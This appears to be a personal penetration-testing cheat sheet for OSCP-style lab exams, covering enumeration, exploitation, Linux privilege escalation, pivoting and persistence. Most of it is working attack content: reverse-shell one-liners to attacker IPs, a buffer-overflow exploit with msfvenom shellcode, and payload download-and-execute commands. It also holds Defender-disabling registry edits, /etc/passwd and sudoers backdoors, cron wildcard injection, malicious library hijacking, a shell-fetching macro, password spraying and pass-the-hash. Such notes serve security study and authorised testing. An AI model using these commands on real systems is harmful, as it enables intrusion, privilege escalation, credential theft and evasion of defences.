# trying harder 1.7
## enumeration
```
- try default credentials (root;admin;username:username...) on all service ports (ftp, weblogins, etc)
- sometimes you overlook something, slow down and read  
- web: nikto, see if webdav is enabled, you might be able to upload files with cadaver
- web: response code 500 try, POST or another method
- view page sources
- ferox cgi-bin with common AND CGI worlists  
- add extra extensions onto feroxbuster htm,html,asp,aspx,txt,php
- /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
- add domain name to /etc/local
- feroxbuster wordlist isn't perfect, guess SMB share names, cewl website
- if webpage has a popup asking for user credentials curl -I to see what webapp its running it might have default credentials
- wordpress: wp-config.php may have passwords
- privesc: sometimes init foothold service has privesc vulnerability
- sometimes port 445; perform nmap smb script scan anyway

# tree diagram to prevent overlooking at things
https://whimsical.com/target-machine-ip-23aVmgehajqmAvT9cH4q2K
```

## UDP enumeration 
```
# preferably run from a low latency machine i.e beachhead pivot
sudo nmap -vv --reason -Pn -sU -A --top-ports=20 -oN udp.txt --version-all <IP>

# port 161: snmp-check 192.168.73.42 -c public
## any interesting strings put into google
# port 69: tftp; nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP>; see 10.11.1.111
```

## exploitation
```
- dont searchsploit full version, use substring of that version eg 2.6 instead of 2.6.31
- ftp make sure its in the right mode (ascii/binary)
- Googlebot/2.1 (+[http://www.googlebot.com/bot.html](http://www.googlebot.com/bot.html))  
- concatenate commands with ; or \&\&
- Google `*unknown word* exploit`  `*unknown word* RCE`  `*unknown word* privesc` 
- if .php page try LFI  
- stealing cookie with XSS (see PWK)
- dont use localhost use 127.0.0.1
- if RCE doesn't work, wrap it around `bash -c` or `cmd /c`
- try different listening port or different architecture
- check if exploit requires reboot
- if nc doesn't work try socat
- try all of the revshells, they may not have nc or bash
- if the vulnarable file cant execute a command, try writing a `exploit.sh` and get the file to run that
- if you can't edit a file try deleting the file and recreating the file, otherwise edit libraries/packages to the file eg. python checks the current working directory before the other PATHs
- if LFI + PHP Session: See PHP reverse shell
- if .mozilla folder: https://github.com/unode/firefox_decrypt
- python pickle
{"py/object": "__main__.Shell", "py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": ["whoami"]}, null, null, null]}
- if you are unsure that you have got RCE run a ping test from victim and run tcpdump to capture ICMP packets
ping -c 2 <kali_IP>
sudo tcpdump -i tun0 icmp
- directory traversal: manually comb through the complete file system (see cheatsheet)
```

## additional cheatsheets
```
https://pentestsector.com/docs/1.0/services/1443-mssql
https://cheatsheet.haax.fr/network/services-enumeration/139_445_smb/
https://oscpnotes.infosecsanyam.in/
https://ppn.snovvcrash.rocks/
```

## useful commands (add to arsenal)
```
# ferox
feroxbuster -u http://10.11.1.234 -w /usr/share/seclists/Discovery/Web-Content/common.txt --quiet -x php -n -o ferox.txt

#rustscan
rustscan -a 10.11.1.227 -r 1-65535 -- -sC -sV -Pn -oN nmap.txt

# bash
ip a | grep 'global tun0' | cut -d '/' -f 1

#powershell
64: [Environment]::is64BitOperatingSytem
tree: Get-ChildItem [-Path C:\data\ScriptingGuys] -recurse

#cmd
64: set pro
shutdown /R

# makes things easier to read (eg web LFI/RCE)
curl http:/<IP>/page | html2markdown

# for CTF or python dependencies you dont want to keep
python3 -m venv env
. ./env/bin/activate
pip install <package>
# alternatively:
pip install -r requirements.txt

# find out what the options mean eg -s tag in curl
curl --help |& grep -- "-s"
```

# active directory (ref:  lab report)
```

```

# buffer overflow
```
# Steps
1. replicate crash
2. generate pattern to find the EIP offset
3. check for bad characters and follow the ESP dump
4. find the return address that doesnt contain badchars (set breakpoint)
5. generate payload
6. add NOPs and payload to the exploit script

#!/usr/bin/python

import sys, socket, struct

cmd = "OVRFLW "
junk = "\x41" * 1241
eip = "\x83\x66\x52\x56" # JMP ESP @ 56526683

end = "\r\n"

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.118 LPORT=445 -f py -b "<bad_chars>"

buf =  b""
buf += b"\x29...

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

nops = "\x90"*10
pattern = "\x41"*(2000-len(junk)-len(eip)-len(buf)-len(nops))

buffer = cmd + junk + eip + nops + buf + pattern + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.118.111', 4455))
s.send(buffer)
s.recv(1024)
s.close()

# python code for generating padding
python3 -c 'print("A"*80)'

# msf code to generate patterns
msf-pattern_create -l 800

# find return address
!mona modules

objdump -d [Executable file]
search for JMP ESP equivilant

- add more nops in front of shellcode if it doesn't execute

# shellcode generation for 32bit windows
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python -v shellcode
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.49.209 LPORT=443  EXITFUNC=thread -e x86/shikata_ga_nai -b '\x00' -i 3 -f python -v shellcode

```

# crackmapexec (cme)
```
crackmapexec smb 192.168.100.0/24 -u <user> -H ntlm_hashFile.txt
# alternative to mimikatz
(proxychains) crackmapexec smb 172.16.242.0/24 -u <user> -p <password> --lsa 2>/dev/null
```
# curl / HTTP (port 80)
```
# reference
https://reqbin.com/curl

# modifying headers and uxing a proxy for burpsuite to catch a curl request
curl -s 'http://10.1.1.1:80/cmd.php' --data-urlencode 'data=/bin/bash -i >& /dev/tcp/192.168.119.239/443 0>&1' --proxy "http://127.0.0.1:8080/" -H "X-Forwarded-For: 10.3.3.88"

#post
curl -X POST --data "data=blah" http://<IP>/page

# put
curl -X PUT http://<IP>/shell.jsp/ -d @- < shell.jsp

# password spray
for user in $(cat users.txt); do curl 'http://<IP>/login' --data "{\"username\":\"${user}\",\"password\":\"P@ssw0rd\"}" -H "Content-Type: application/json" 2>/dev/null | grep -v Unauthorized && echo $user ; done
OK
bob
# this means credentials is bob:P@ssw0rd

# command injection
reference:
https://book.hacktricks.xyz/pentesting-web/command-injection
https://hackersonlineclub.com/command-injection-cheatsheet/
```

## web application specific
```
# myphpadmin: file upload
https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f

# squid proxy: scan ports behind proxy
msfconsole -q -x "use use auxiliary/scanner/http/squid_pivot_scanning; set RPORT 3128; set RHOST 192.168.236.189; set RANGE 192.168.236.189; exploit"
```
# directory traversal
```
# paths to investigate
https://pentestlab.blog/2012/06/29/directory-traversal-cheat-sheet/
https://akimbocore.com/article/linux-path-traversal-cheat-sheet/
https://gist.github.com/SleepyLctl/823c4d29f834a71ba995238e80eb15f9
https://pentestwiki.org/directory-traversal-cheat-sheet/
https://anhtai.me/linux-privilege-escalation-some/ (see sections with cat commands)

# windows test
C:\windows\System32\Drivers\etc\hosts

# tips
- directory traversal doesn't mean you can list (dir, ls)
- look for stored password (see password section)
- use nmap results as a hint for what folders/files
- if you suspect credentials are stored in Program Files (x86) try without (x86)
```

# disable AV
```
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f

# alternatively:
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All  
Set-MpPreference -DisableRealtimeMonitoring $true
```

# docker
```
see if root folder has .dockerenv to know if you are in a docker instance

# mount host machine
fdisk -l
mount /dev/sda1 /mnt
```

```
# privesc via SUID
find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/docker
...
# use one of the images already downloaded
docker image ls
...
ubuntu              18.04               56def654ec22        2 years ago         63.2MB

# mount into the guest image as root bit use the host file system 
/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh


```

# ffuf (TODO: Add to navi)
```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://<IP>/test.php?FUZZ=/etc/passwd' -fs 80
```

# file transfer
```
powershell iwr http://192.168.49.124/shell.ps1 -o C:/Windows/Temp/shell.ps1
# alternatively:
c:\Windows\System32\WindowsPowerShell\v1.0>.\powershell.exe
(New-Object System.Net.WebClient).DownloadFile("http://192.168.49.55/msf.dll", "C:\Users\tony\Desktop\shell.dll")
# alternatively: IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.49.55/Invoke-Mimikatz.ps1')
# alternative:
powershell.exe Invoke-WebRequest  http://10.50.108.41/mimikatz.exe -outfile  mimikatz.exe

wget http://192.168.49.124/shell.ps1 -O C:/Windows/Tasks/shell.ps1

TODO: move to arsenal
certutil -urlcache -split -f "http://192.168.49.55/shell.exe" C:/Windows/Tasks/shell.ps1

bitsadmin /transfer n http://domain/file c:%homepath%file

# upload
https://github.com/Densaugeo/uploadserver
curl -X POST http://127.0.0.1:8000/upload -F 'files=@multiple-example-1.txt' -F 'files=@multiple-example-2.txt'

# writable folders
C:/Windows/Tasks/
C:/Windows/Temp/

# creating and accessing kali smb share
# on kali
impacket-smbserver -smb2support -username evil -password evil evil $PWD
# on windows
net use z: \\<KALI_IP>\evil /user:evil evil
# example copy file
copy Z:\shell.exe .
```

# find / search files
```
grep -lr 'AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im'
grep -rnw . -e 'AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im.*'
```

# FTP (port 21)
```
# recursively download files from server
wget -m ftp://anonymous:anonymous@<ip>

# make sure passive is on for listing files
# directory traversal you may need to escape backslashes 'C:\\'
```

# git
```
# clone local repo
git clone file:///git-server/
# inside the cloned folder you can read logs
git log
```

# IIS
```
# IIS asp payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp

typical location: C:\Inetpub\wwwroot\aspnet_client
```

# indent (port 133)
```
ident-user-enum 192.168.1.100 22 113 139 445
```

# LDAP (port 389)
```
# credentialed search
nmap <IP> -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'

# nmap result
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
nmap -n -sV --script "ldap* and not brute" <IP>

# further enumeration
# reference (ippsec): https://www.youtube.com/watch?v=mr-fsVLoQGw&t=525s
#get domain info ie naming context (nmap should print this as well)
ldapsearch -x -H ldap://<IP> -s base namingcontexts

ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"

# example: hutch
ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
 grep sAMAccountName:
ldapsearch -x -h 192.168.159.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description
ldapsearch -x -h 192.168.64.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 

# if LAPS application is used
ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

# LFI
```
?file=../../../../../etc/passwd
?file=../../../../../home/<user>/.ssh/id_rsa (ssh without password)  
?file=../../../../../var/log/auth.log  
ssh '<?php system($_GET['c']); ?>'@192.168.1.136  
?file=../../../../../var/log/auth.log&c=<reverseshell payload>
# windows backwards slash
..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cconfig%5Csam

ref: https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi2rce

# log poisoning
nc -nv <IP> 80
<?php echo '<pre>' . shell_exec($_GET['cmd'])  . '</pre>'; ?>
# code execution
curl "http://192.168.246.10/menu.php?file=C:\xampp\apache\logs\access.log&cmd=ipconfig"

# wrapper
http://10.11.0.22/menu.php?file=data:text/plain,<?php shell_exec("dir");?>

# mail log: /var/mail/
# reference: https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/
```
# linpeas / linux privesc
## enumeration
```
# simple cheatsheet
https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html
https://github.com/sagishahar/lpeworkshop
https://mil0.io/linux-privesc/

./linpeas.sh -a -q | tee enum.txt
less -r enum.txt
# note: SUID exploits go hand in hand with GTFObins

# copy linpeas to victim (Example: SCP)
scp -i dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 -oKexAlgorithms=+diffie-hellman-group1-sha1 linpeas.sh bob@10.11.1.136:/tmp
linpeas.sh

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl http://192.168.49.55/linpeas.sh | sh | nc 192.168.119.195 9002 #Victim

# manual enumeration
# reference:
https://github.com/xChockax/Linux-Windows-PrivEsc---Dark-Mode-Guides/blob/main/TCM%20LinPrivEsc_DarkMode.pdf
https://github.com/C0nd4/OSCP-Priv-Esc

try switching user and using the username as password also
grab the hash: cat /etc/shadow

check logs for various service: cat /var/log/*
recursively check home folders: ls -lahR /home
look for special files in home folder ".*_history" , ".ssh" or ".gpg
check home folders outside /home: cat /etc/passwd
check juicing info from browser (history, saved passwords, homepage etc):
pidof firefox/chrome/etc
check flavor of OS: cat /etc/issue
check version: cat /proc/version
check environment variables: env

# enumerate networks, look for ports not discovered before: 
netstat -antup | netstat -tulpn | ss -tulpn
if there is an interesting port remote tunnel then scan with nmap
ssh -N -R  <attacker ip>:2221:127.0.0.1:<port> kali@<attacker ip>

look at file system for interesting mounts: cat /etc/fstab  

# sniff loopback  
tcpdump -i lo -w tcpdump.pcap
# read the dump  
tcpdump -qns 0 -A -r tcpdump.pcap

# list all installed programs
dpkg -l

# find writable folders
find / -writable -type d 2>/dev/null 

# find SUID (see below for exploitation)
find / -perm -u=s -type f 2>/dev/null
find / -perm /4000 2>/dev/null

# find readable files for groups you don't belong to
find / -group <group> -readable 2>/dev/null
# interesting groups
root, sudo/admin/wheel, disk, shadow, adm, ldx

# see what you can run as root
sudo -l

# special case: if target is running mysql see UDF privesc
# special case: check which web server is running as root upload a reverse shell (see adam 10.2.2.150)
curl 'http://127.0.0.1:8080/start_page.php?page=cmd.php' --data-urlencode 'cmd=echo "root2:A83.Sw25.YvMk:0:0:root:/root:/bin/bash" >> /etc/passwd'
# special case: if python script is run by root (privesc)
in .py file append: os.system("nc -e /bin/bash 172.16.30.2 4545")

# last resort: cross check every installed application with ExploitDB
```

## exploitation
### overwriting files
```
# entry points:
- user has write access to these files
- user can access services run by root that can write to files

# add user to passwd
openssl passwd test
QfvjLmr9pkn4Q
echo "root2:ukA3D00WHa/pA:0:0:root:/root:/bin/bash" >> /etc/passwd

#alternatively: 
openssl passwd -1 -salt hack pass123
$1$hack$22.CgYt2uMolqeatCk9ih/

# bash escape passwd
"\\x0A\\x0Aroot:Password1"

# elevate user to allow sudo
echo "www-data ALL=(ALL) NOPASSWD:ALL" >>/etc/sudoers
```
### binary / path highjacking (SUID):
```
# run strings on SUID binary to see if it is executing spoofable binaries

# if SUID file is writable
cd /tmp
echo "/bin/bash -p" > <HIGHJACK_FILE>

# if you can run gcc on victim
https://github.com/jivoi/pentest/blob/master/shell/rootshell.c
# alternatively: 
echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > rootshell.c
gcc rootshell.c -o <HIGHJACK_FILE>

# if you cannot run gcc on victim
echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p;"" > <HIGHJACK_FILE>
chmod +x <HIGHJACK_FILE>
# alternatively: try 755 or 777 instead of +x

# path highjacking
export PATH=/tmp:$PATH
# then run <HIGHJACK_FILE> or program that is calling <HIGHJACK_FILE>

### EXAMPLE: SUID binary & path hijacking ###
# On victim
bob@sufferance:~$ ls -l /usr/local/bin/uploadtosecure
-rwsr-xr-x 1 root root 6923 2008-10-07 19:38 /usr/local/bin/uploadtosecure
bob@sufferance:~$ strings /usr/local/bin/uploadtosecure
...
scp -r file/tobesecured/* 192.168.1.23:/var/www/html/files/

# on kali
msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o scp
# on victim (same as spoof binary)
wget 192.168.1.23/scp -O /tmp/scp # transfer the exec binary over to Sufferance
chmod 755 /tmp/scp
export PATH=/tmp:$PATH

Alternatively:
# on victim
echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p;" > /tmp/scp
chmod +x /tmp/scp
export PATH=/tmp:$PATH

# call malicious scp binary in /tmp instead
/usr/local/bin/uploadtosecure

# if you run strings on a binary and find a function e.g. "service" to hijack
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
# alternatively:
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/<suid_binary>; set +x; /tmp/bash -p'
# then execute binary with the hijacked function
```
### cron
```
ls -lah /etc/cron*
cat /etc/crontab  
grep "CRON" /var/log/cron.log

https://cheatsheet.haax.fr/linux-systems/privilege-escalation/crontab/#writable-cron-directory

# cron wildcard
# reference: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
# if you see a wildcard in a command in crontab
*/01 * * * * cd /var/log/mon && tar -zcf /tmp/mon.tar.gz *
echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```
### dirty pipe static binary
```
https://github.com/crowsec-edtech/Dirty-Pipe
```
### escape shell/binary privesc
```
https://gtfobins.github.io/
- Example: when you are in a docker group, you can privesc
```
### library hijacking .so (shared object)
```
# ref:
https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2

# see libraries required by binary
ldd /usr/bin/messenger

# inspect library configs
ls /etc/ld.so.conf.d/
#alternatively:
cat /etc/crontab | grep LD_LIBRARY_PATH

# find a writable directory that is higher priority PATH to create our malicious library

# create c code for the library

# after typing the cat command copy and paste the C code
cat <<EOL > root.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int _init(void)
{
setuid(0); setgid(0); system("/bin/bash -i >& /dev/tcp/192.168.49.60/21 0>&1");
}
EOL
# sutuational: if the binary has the SUID bit set
setuid(0); setgid(0); system("/bin/bash");

# alternatively (example for CUPS exploit):
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject(){
	system("cp /bin/bash /tmp/bash && chmod 7777 /tmp/bash && /tmp/bash -p");
}
#then compile and run

gcc root.c -o hijacked_library_name.so -shared -Wall -fPIC -w
# alternatively
gcc -shared -o <spoof library name>.so -fPIC root.c
# alternatively if you use the _init function name
gcc -shared -o utils.so -fPIC -nostartfiles root.c
# alternatively: msfvenom, have have a way to upload to victim
msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o hijacked_library_name.so LHOST=kali LPORT=6379
# alternatively: msfvenom, have have a way to upload to victim
msfvenom -p linux/x86/exec CMD=/bin/sh -f elf-so -o hijacked_library_name.so

# situational: run ldd again to see if the malicious library is linked

# troubleshooting
- export PATH
function name for c code matters if _init doesnt work; strings the binary to guess a function
```
### no_root_squash
```
# on victim
ssh -N -R  <attacker ip>:2221:127.0.0.1:<nfs port> kali@<attacker ip>

# on kali 
mount -v -o port=2221 -t nfs 127.0.0.1:/srv/Share /tmp/pe  
cd /tmp/pe

# on victim
cd /srv/Share
./sh -p  
whoami  
root

# /bin/bash relies on libtinfo.so.6 so we use sh instead  
cp /bin/sh  
chmod +s ./sh  
ls -lah (make sure user and group is root for sh)  
-rwsr-sr-x  1 root root 123K Jan 18 15:04 sh

copy root files and execute as user
```
### passwords
```
get passwords by copying passwd/shadow to public share
```
### port forward a hidden port
```
ssh  -L  8080:127.0.0.1:8080 <username>@<remote IP>
alternatively: ssh <username>@<remote IP> -R 8080:127.0.0.1:8080
# if forwarding a web port you can then visit it
firefox: http://localhost:8080
```
### switch user
```
sudo -u <SUID user> /bin/bash
su root -
```

# macros
```
# word macro: 
https://www.thedecentshub.tech/2021/08/reverse-shell-from-word-documents.html?m=1 

# libreoffice macro: 
https://noobintheshell.medium.com/htb-re-f922080c963d

Sub Main
   Shell ("cmd /c powershell iwr http://192.168.49.124/shell.ps1 -o C:/Windows/Temp/shell.ps1")
   Shell ("cmd /c powershell -c C:/Windows/Temp/shell.ps1")
End Sub
``` 

# NFS / mountd (port 2049/2048)
```
# enum
showmount -e <vic_IP>
nmap --script=nfs-showmount <vic_IP>

# exploit
mkdir /mnt/nfs
sudo mount -v -t nfs <vic_IP>:<SHARE> /mnt/nfs
# alternatively
sudo mount -v -t nfs -o vers=2 <vic_IP>:<SHARE> /mnt/nfs

# privesc: see no_root_sqash
```
# password / pass-the-hash
```
# cewl
eg. cewl -d 10 -m 1 -w wordlist.txt [https://example.com](https://example.com)  
-d is depth of website  
-m is minimum characters to scrape  
-w is output wordlist  
# takes a name and creates wordlist of possible usernames
https://github.com/jseidl/usernamer

# hydra TODO: add to arsenal
hydra -f -l [user_name] -P [password_file_path] [service_name]://[target_IP_address] -o cred.txt
e.g. telnet: hydra -L users.txt -P passwords.txt <ip> telnet

unshadow passwd shadow.bak > passwords.txt  
cat passwords.txt  
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt

john --show passwords.txt

# pass the hash
xfreerdp /u:josh /d:testlab /pth:64f12cddaa88057e06a81b54e73b949b /v:192.168.112.200 /cert-ignore
pth-winexe -U john%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.0.1 cmd

# over pass the hash: see rubeus in ad.md

# password files to look for also check for backups
# if you suspect credentials are stored in Program Files (x86) try without (x86)
/etc/passwd && /etc/shadow
C:\Windows\system32\config\RegBack\sam
C:\Windows\system32\config\RegBack\security
C:\Windows\system32\config\RegBack\system
python creddump/pwdump.py system sam
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf
/usr/local/apache-tomcat8/conf/tomcat-users.xml
(C:)/xampp/security/webdav.htpass || passwd.dav || 
(C:)\xampp\htdocs\blog\wp-config.php
/export/samba/secure/smbpasswd.bak
/etc/samba/smb.conf
C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml
```

# persistence
```
ssh-keygen -t rsa
cat id_rsa.pub
#copy and paste into authorized_keys on victim
echo "ssh-rsa AAAAB3NzaC...jRc= kali@kali" >> /root/.ssh/authorized_keys
# alternatively:
cat id_rsa.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
# now you can ssh onto victim machine from kali as root
ssh root@10.11.1.101
```

# pivoting
```
# static tools to run on the linux beachhead
https://github.com/ernw/static-toolbox/releases

# chisel: see ad.md
# netsh: see netsh in ad.md section of this cheatsheet or ctrl+f "netsh"

# sshuttle (may require python to be installed on pivot):
sshuttle -r sean@10.11.1.251 10.1.1.0/24

# proxychains
vim /etc/proxychains4.conf
# append service you want to proxy
http <IP> <port>
# use proxychains to execute commands
proxychains python exploit.py
```

# redis
```
https://github.com/n0b0dyCN/redis-rogue-server
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#load-redis-module
```

# reverse shell tips / RCE tips
```
ref: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

# if nc -e flag isn't available
ref: https://spencerdodd.github.io/2017/02/21/reverse_shell_without_nce/
# example 1
mknod /tmp/backpipe p 
/bin/sh 0</tmp/backpipe | nc 192.168.56.1 4444 1>/tmp/backpipe
# example 2 (if telnet is enabled)
mknod a p && telnet 192.168.49.233 443 0<a | /bin/sh 1>a

# base 64 payload decode and pipe to bash
echo "<reverse_payload>" | sh

# another python one liner calling reverse shell in bash (url encoded)
__import__("os").system("bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.101/80+0>%261'")

# powershell obfuscated to bypass AV
https://github.com/ivan-sincek/powershell-reverse-tcp/tree/master/src/invoke_expression/obfuscated/invoke_obfuscation
# alternatively: ctrl+f encode
https://github.com/samratashok/nishang
# another obfuscated powershell reverse shell
https://github.com/t3l3machus/hoaxshell
# also look at powercat and scshell
# sc shell (not detected by AV) may require service account as admin and RPC port open
https://github.com/Mr-Un1k0d3r/SCShell

# upload shell via php + netcat 
# on the webapp upload generic file and rename in burp
<?php echo exec('nc -lvnp 443 >shell.php 2>&1'); ?>.php
# transfer file via netcat
nc -nv <target_ip> 443 <shell.php
curl http://target_ip/<session_id>/shell.php

# windows php reverse shell
https://github.com/Dhayalanb/windows-php-reverse-shell
# operating system agnostic
https://github.com/ivan-sincek/php-reverse-shell

# perl shell
shell.php?cmd=perl -e 'use Socket;$i="192.168.xx.xx";$p=22;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# input validation rename your payload to index.html
# wget ip address without http:// will download index.html and RCE to rename
```

## msfvenom payloads
```
list formats
# msfvenom --list formats

# bad characters/alphanumeric
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.53 LPORT=443 -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed -f c

# tomcat jsp/war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.177 LPORT=31337 -f raw > shell.jsp  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war  

# apache
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
```

## PHP reverse shells
```
# evil.php:  
<?php passthru("0<&196;exec 196<>/dev/tcp/192.168.119.171/8000; /bin/sh <&196 >&196 2>&196"); ?>  

<?php exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.119.134/4444 0>&1'"); ?>

# Example: php LFI session poisoning
Register with user: <?php system($_POST["cmd"]);?>
# record PHP session_id
# burpsuite POST request with LFI to session.save_path dir: /var/lib/php/sessions/sess_<session_id>
# edit POST with same session_id and add post data:
&cmd=<reverse_shell_payload>
```

# SNMP (port 161/162)
```
snmp-check -c public $ip
onesixtyone -c /usr/share/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $ip

# if you can modify /usr/share/snmp/snmp.conf
echo "<bash_shell_code>" > /usr/share/snmp/snmp.conf
# execute snmpwalk to trigger shell code
```
# SMB
## create a share in C:\\
```
# if you can create a share folder via RDP
\\<HOSTNAME/IP>\share
# disable authentication
https://superuser.com/questions/1300639/how-to-create-anonymous-share-on-windows-10
```
## Enumeration
```
enum4linux -a <IP> 
nmap --script "safe or smb-enum-*" -p 445 <IP>
nmap --script "smb-vuln*" -Pn -p 139,445 <IP> | tee nmap_smb-vuln.txt
  
smbmap [-d workgroup] -H <IP>  
smbclient --no-pass -L //<IP>
smbclient \\\\192.168.209.175\\'Password Audit' -U 'resourced/v.ventz%HotelCalifornia194!'

# commands: https://tools.thehacker.recipes/impacket/examples/smbclient.py
# (usage example on a domain controller)
smbclient.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
impacket-smbclient v.ventz:'HotelCalifornia194!'@192.168.209.175
# null user
impacket-smbclient -no-pass null@192.168.66.172

crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
extra commands:
https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/

# eternalblue
# reference: https://redteamzone.com/EternalBlue/
